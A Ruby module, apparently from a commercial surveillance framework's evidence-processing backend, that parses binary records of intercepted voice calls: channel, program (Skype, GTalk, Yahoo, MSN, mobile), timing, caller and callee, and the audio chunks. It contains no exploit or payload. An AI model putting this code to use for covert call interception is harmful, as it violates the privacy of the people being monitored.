
require 'rcs-common/evidence/common'

module RCS

module CallEvidence
  
  LOG_VOICE_VERSION = 2008121901
  CHANNEL = { 0 => :incoming, 1 => :outgoing }
  SOFTWARE = { 0x0141 => "Skype",
              0x0142 => "GTalk",
              0x0143 => "Yahoo",
              0x0144 => "Msn",
              0x0145 => "Mobile",
              0x0146 => "Skype",
              0X0147 => "Msn" }
  
  def decode_additional_header(data)
    
    raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.bytesize == 0
    
    stream = StringIO.new data
    version = read_uint32 stream
    
    raise EvidenceDeserializeError.new("invalid log version for voice call") unless version == LOG_VOICE_VERSION
    
    ret = Hash.new
    ret[:data] = Hash.new
    channel = read_uint32 stream
    ret[:data][:channel] = CHANNEL[channel]    
    ret[:data][:program] = SOFTWARE[read_uint32 stream]
    ret[:data][:sample_rate] = read_uint32 stream
    ret[:data][:incoming] = read_uint32 stream
    low, high = stream.read(8).unpack 'V2'
    ret[:data][:start_time] = Time.from_filetime high, low
    low, high = stream.read(8).unpack 'V2'
    ret[:data][:stop_time] = Time.from_filetime high, low
    
    caller_len = read_uint32 stream
    callee_len = read_uint32 stream
    
    raise RCS::EvidenceDeserializeError.new("invalid callee") if callee_len == 0
    
    ret[:data][:caller] ||= stream.read(caller_len).utf16le_to_utf8.lstrip.rstrip if caller_len != 0
    ret[:data][:peer] ||= stream.read(callee_len).utf16le_to_utf8.lstrip.rstrip if callee_len != 0
    return ret
  end
  
  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new
    
    info[:data][:grid_content] = chunks.join
    yield info if block_given?
    :keep_raw
  end
end

end # RCS::